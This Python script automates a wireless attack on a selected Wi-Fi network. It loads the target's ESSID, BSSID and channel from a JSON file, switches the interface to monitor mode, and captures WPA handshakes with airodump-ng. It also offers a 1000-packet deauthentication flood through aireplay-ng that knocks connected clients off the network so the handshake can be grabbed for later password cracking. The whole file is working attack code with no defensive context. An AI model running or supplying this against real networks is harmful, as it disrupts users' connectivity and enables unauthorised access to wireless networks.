import subprocess
import json
import time
import os

def read_target(file='../../tools/target_selector/selected_target.json'):
    with open(file, 'r') as f:
        target = json.load(f)
    print(f"[+] Target loaded: {target['ESSID']} ({target['BSSID']}) on Channel {target['Channel']}")
    return target

def enable_monitor_mode(interface):
    print(f"[+] Enabling monitor mode on {interface}...")
    subprocess.run(['airmon-ng', 'start', interface], check=True)
    return interface + 'mon'

def disable_monitor_mode(mon_interface):
    print(f"[+] Disabling monitor mode on {mon_interface}...")
    subprocess.run(['airmon-ng', 'stop', mon_interface], check=True)

def start_airodump(mon_interface, bssid, channel, essid, output_file):
    print(f"[+] Starting airodump-ng targeting {essid} on channel {channel}")
    dump_process = subprocess.Popen([
        'airodump-ng',
        '--bssid', bssid,
        '--channel', str(channel),
        '--write', output_file,
        mon_interface
    ])
    return dump_process

def start_deauth(mon_interface, bssid):
    print(f"[+] Starting deauth attack on {bssid}")
    deauth_process = subprocess.Popen([
        'aireplay-ng',
        '--deauth', '1000',
        '-a', bssid,
        mon_interface
    ])
    return deauth_process

def main():
    interface = 'wlan0'
    output_dir = 'handshakes/'
    os.makedirs(output_dir, exist_ok=True)

    target = read_target()
    mon_interface = enable_monitor_mode(interface)

    output_file = os.path.join(output_dir, f"{target['ESSID'].replace(' ', '_')}_capture")

    # Start airodump
    dump_process = start_airodump(mon_interface, target['BSSID'], target['Channel'], target['ESSID'], output_file)

    # Ask for deauth
    choice = input("\n[?] Do you want to run deauth attack? (y/n): ").strip().lower()
    deauth_process = None
    if choice == 'y':
        deauth_process = start_deauth(mon_interface, target['BSSID'])

    try:
        print("\n[+] Handshake capturing started. Press Ctrl+C to stop when handshake is captured.")
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[+] Stopping capture...")

    # Clean up processes
    dump_process.terminate()
    if deauth_process:
        deauth_process.terminate()
    disable_monitor_mode(mon_interface)
    print("[+] Handshake capture completed. Check handshakes/ folder.")

if __name__ == "__main__":
    main()
